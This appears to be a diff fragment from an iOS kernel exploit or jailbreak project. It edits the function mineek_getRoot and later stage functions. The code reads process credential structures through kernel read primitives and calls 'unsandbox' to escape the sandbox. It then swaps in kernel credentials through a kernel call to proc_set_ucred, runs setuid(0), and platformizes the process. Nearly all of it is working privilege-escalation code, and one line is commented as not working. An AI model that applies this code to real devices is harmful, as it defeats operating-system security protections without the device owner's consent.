@@ -107,9 +107,9 @@ uint64_t mineek_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint
 
 void mineek_getRoot(uint64_t proc_addr)
 {
-    uint64_t self_ro = kread64(proc_addr + 0x20);
+    self_ro = kread64(proc_addr + 0x20);
     printf("[i] self_ro: 0x%llx\n", self_ro);
-    uint64_t self_ucred = kread64(self_ro + 0x20);
+    self_ucred = kread64(self_ro + 0x20);
     printf("[i] ucred: 0x%llx\n", self_ucred);
     printf("[i] test_uid = %d\n", getuid());
 
@@ -124,6 +124,12 @@ void mineek_getRoot(uint64_t proc_addr)
     uint64_t proc_set_ucred = off_proc_set_ucred;
     proc_set_ucred += get_kslide();
     printf("[i] func: 0x%llx\n", proc_set_ucred);
+    
+    cr_label = kread64(self_ucred + off_u_cr_label); // MAC label
+    orig_sb = kread64(cr_label + off_sandbox_slot);// not working
+
+    sb = unsandbox(getpid());
+    
     kcall(proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
     setuid(0);
     setuid(0);
@@ -162,7 +168,7 @@ void stage2(void) {
     uint64_t proc_addr = proc_of_pid(getpid());
     printf("[i] proc_addr: 0x%llx\n", proc_addr);
     printf("[i] init_kcall!\n");
-    mineek_init_kcall();
+    init_kcall();
     printf("[i] getRoot!\n");
     mineek_getRoot(proc_addr);
     usleep(10000);
@@ -181,5 +187,6 @@ void stage2_all(void) {
     usleep(10000);
     ucred_test(proc_addr);
     usleep(10000);
-    prepare_kcall();
+    unsandbox_stage2();
+    platformize(pid);
 }
